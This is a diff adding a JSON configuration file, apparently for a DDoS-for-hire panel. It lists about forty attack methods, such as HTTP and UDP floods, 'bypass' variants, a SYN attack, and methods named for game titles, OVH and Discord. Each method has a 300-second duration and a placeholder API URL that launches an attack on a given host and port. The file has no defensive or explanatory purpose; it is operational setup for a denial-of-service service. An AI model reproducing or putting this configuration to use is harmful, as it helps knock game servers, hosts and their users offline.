@@ -1,0 +1,371 @@
+[
+	{
+		"name":"http-space",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=http-space"
+		]
+	},
+	{
+		"name":"http-xv",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=http-xv"
+		]
+	},
+	{
+		"name":"http-death",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=http-death"
+		]
+	},
+	{
+		"name":"http-rapid",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=http-rapid"
+		]
+	},
+	{
+		"name":"http-bypass",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=http-bypass"
+		]
+	},
+	{
+		"name":"http-aikill",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=http-aikill"
+		]
+	},
+	{
+		"name":"handshake",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=handshake"
+		]
+	},
+	{
+		"name":"home",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=home"
+		]
+	},
+	{
+		"name":"mc-socket",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=mc-socket"
+		]
+	},
+	{
+		"name":"socket-tcp",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=socket-tcp"
+		]
+	},
+	{
+		"name":"udpbypass",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=udpbypass"
+		]
+	},
+	{
+		"name":"tcpbypass",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcpbypass"
+		]
+	},
+	{
+		"name":"pps",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=pps"
+		]
+	},
+	{
+		"name":"udp-space",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=udp-space"
+		]
+	},
+	{
+		"name":"udp-game",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=udp-game"
+		]
+	},
+	{
+		"name":"udp-gbps",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=udp-gbps"
+		]
+	},
+	{
+		"name":"udp",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=udp"
+		]
+	},
+	{
+		"name":"fortnite",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=fortnite"
+		]
+	},
+	{
+		"name":"warzone",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=warzone"
+		]
+	},
+	{
+		"name":"fivem",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=fivem"
+		]
+	},
+	{
+		"name":"r6-beta",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=r6-beta"
+		]
+	},
+	{
+		"name":"amongus",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=amongus"
+		]
+	},
+	{
+		"name":"overwatch",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=overwatch"
+		]
+	},
+	{
+		"name":"unturned",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=unturned"
+		]
+	},
+	{
+		"name":"battlefield",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=battlefield"
+		]
+	},
+	{
+		"name":"csgo",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=csgo"
+		]
+	},
+	{
+		"name":"rl-beta",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=rl-beta"
+		]
+	},
+	{
+		"name":"pubg",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=pubg"
+		]
+	},
+	{
+		"name":"bo6-cod",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bo6-cod"
+		]
+	},
+	{
+		"name":"abi-kill",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=abi-kill"
+		]
+	},
+	{
+		"name":"eft-kill",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=udp"
+		]
+	},
+	{
+		"name":"ovh",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=ovh"
+		]
+	},
+	{
+		"name":"discord",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=discord"
+		]
+	},
+	{
+		"name":"syn-comb",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=syn-comb"
+		]
+	},
+	{
+		"name":"raw",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=raw"
+		]
+	},
+	{
+		"name":"tls",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls"
+		]
+	},
+	{
+		"name":"nfo-space",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=nfo-space"
+		]
+	},
+	{
+		"name":"game-space",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=game-space"
+		]
+	},
+	{
+		"name":"home-space",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=home-space"
+		]
+	},
+	{
+		"name":"ovh-space",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=ovh-space"
+		]
+	},
+	{
+		"name":"udp-space",
+		"time":300,
+		"description":"idk what to write",
+		"permission":[],
+		"api":[
+			"http://yourwebsiteapi/api/attack?username=user&secret=user&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=udp-space"
+		]
+	}
+]
